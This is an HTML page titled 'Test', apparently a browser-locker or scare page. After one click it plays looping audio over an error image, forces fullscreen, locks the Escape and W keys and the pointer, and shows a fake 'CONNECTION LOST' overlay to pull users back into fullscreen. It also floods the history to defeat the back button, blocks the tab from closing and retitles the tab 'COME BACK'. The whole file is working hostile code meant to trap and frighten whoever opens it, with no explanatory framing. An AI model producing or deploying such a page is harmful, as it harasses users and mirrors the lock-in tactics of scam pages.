<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test</title>
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            overflow: hidden; background-color: black;
            display: flex; justify-content: center; align-items: center;
        }

        #shaker-box {
            width: 100vw; height: 100vh;
            display: flex; justify-content: center; align-items: center;
        }

        #error-img {
            max-width: 100%; max-height: 100%; object-fit: contain;
        }

        #conf {
            width: 100%; height: 100%; top: 0; left: 0;
            position: fixed; background: white; z-index: 99;
            display: flex; justify-content: center; align-items: center;
        }

        #fullscreen-trap {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); z-index: 10000; cursor: pointer;
            color: white; font-family: sans-serif; text-align: center; padding-top: 20%;
        }
    </style>
</head>
<body>

    <div id="shaker-box">
        <img src="error2.png" id="error-img">
    </div>

    <div id="conf"><input type="button" value="click here" onclick="start()"></div>
    
    <div id="fullscreen-trap" onclick="forceFullscreen()">
        <h1>CONNECTION LOST</h1><p>CLICK TO RE-ENTER</p>
    </div>
    
    <audio id="jump" loop><source src="error.mp3"></audio>

    <script>
        const trap = document.getElementById('fullscreen-trap');

        async function forceFullscreen() {
            const elem = document.documentElement;
            try {
                if (elem.requestFullscreen) await elem.requestFullscreen();
                // Utilizes the [Keyboard Lock API](https://developer.mozilla.org)
                if (navigator.keyboard && navigator.keyboard.lock) await navigator.keyboard.lock(["Escape", "KeyW"]);
                if (elem.requestPointerLock) elem.requestPointerLock();
                trap.style.display = 'none';
            } catch (err) {}
        }

        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement) trap.style.display = 'block';
        });

        function start() {
            document.getElementById('conf').style.display = 'none';
            document.querySelector('#jump').play();
            forceFullscreen();
            
            // History manipulation to prevent simple back-button exit
            window.history.pushState(null, null, window.location.href);
            window.onpopstate = () => { window.history.go(1); };
            
            // Standard [onbeforeunload](https://developer.mozilla.org) implementation
            window.onbeforeunload = (e) => { 
                e.preventDefault(); 
                e.returnValue = ''; 
                localStorage.x = 1;
            };

            setInterval(() => { window.history.pushState(null, "", window.location.href); }, 100);
            
            document.addEventListener('visibilitychange', () => {
                document.title = document.hidden ? "COME BACK" : "test";
            });
        }
    </script>
</body>
</html>
